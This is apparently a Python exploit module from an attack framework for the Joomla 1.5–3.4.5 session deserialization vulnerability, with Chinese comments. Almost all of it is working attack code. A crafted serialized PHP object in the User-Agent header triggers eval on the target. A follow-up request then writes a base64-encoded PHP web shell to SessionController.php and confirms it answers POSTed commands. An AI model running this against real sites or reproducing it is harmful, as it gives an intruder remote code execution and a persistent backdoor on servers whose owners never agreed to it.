# coding: utf-8

import os
import sys
import datetime
import urllib
from exp_template import Exploit, Level, session
import re

"""
构造函数需要传递以下参数:
url      要测试的目标
taskid   默认为0，当没有创建任务时使用
targetid 默认为0，当没有创建任务时使用

exp需要实现的方法为meta_info和exploit
cms无法安装所以exp打击无法实现
modify by swm 20180817

"""
class joomla_sessoin_deserialize(Exploit):
    def meta_info(self):
        return {
            'name': 'joomla_sessoin_deserialize',
            'author': 'h',
            'date': '2018-02-02',
            'attack_type': 'GetShell',
            'app_type': 'CMS',              #路由器为Router
            'app_name': 'Joomla',
            'min_version': '1.5',
            'max_version': '3.4.5',
            'version_list': '',             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'Joomla 1.5-3.4.5 反序列化漏洞，前台访问时，将User-Agent序列化后存入数据库，再次访问时会反序列化，导致命令执行，可执行php代码',
            'reference':'Joomla 1.5-3.4.5 反序列化漏洞.docx',   #参考文档
            'cve':'',
        } 
        
    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        for i in range(10):
            self.url = self.url.strip('/')
        code = "file_put_contents(str_replace('index.php','SessionController.php',$_SERVER['SCRIPT_FILENAME']),base64_decode('PD9waHAgZXZhbCgkX1BPU1RbMTA4NDcyXSk7Pz4='));"
        url = self.url + '/?123='
        url = url + urllib.quote("@set_time_limit(30);@set_magic_quotes_runtime(0);echo '6CA03990D5'.chr(97);" +code+ "echo '9CA9082859';")
        # ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}'
        # ua += 's:8:"feed_url";s:48:"eval($_REQUEST[123]);JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}'
        # ua += 's:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'
        command = 'eval($_REQUEST[123])'
        headers = {
            "User-Agent": '''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:%s:"%s;JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86''' % (
            len(command) + 28, command)
        }
        req = session()
        try:
            rsp = req.get(url=url, headers=headers)
        except:
            self.report('Error_1: 无法连接目标', Level.error)
            return
        try:
            rsp = req.get(url=url)
        except:
            self.report('Error_2: Exploit写入失败', Level.error)
            return
        m = re.findall(r'6CA03990D5a(.*?)9CA9082859', rsp.text, re.DOTALL)
        print rsp.text
        if m:
            rootsite = self.url+'/SessionController.php'
            try:
                rsp = req.post(url=rootsite, data={"108472":'echo "193".chr(97);'})
            except:
                self.report('Error_4: 访问Shell失败', Level.error)
                return
            if rsp.status_code == 200 and rsp.text.find("193a") >= 0:
                self.shell_info(rootsite, '108472', 'php')
                return               
        else:
            self.report('Error3:cannot getshell', Level.error)


if __name__ == "__main__":
    # url = 'http://localhost:90/'
    # a = joomla_sessoin_deserialize(url)
    # a.exploit()
    if len(sys.argv) == 2:
        a = joomla_sessoin_deserialize(sys.argv[1])
        a.exploit()
    else:
        print '%s url' %  __file__
        print '%s http://192.168.1.11' %  __file__

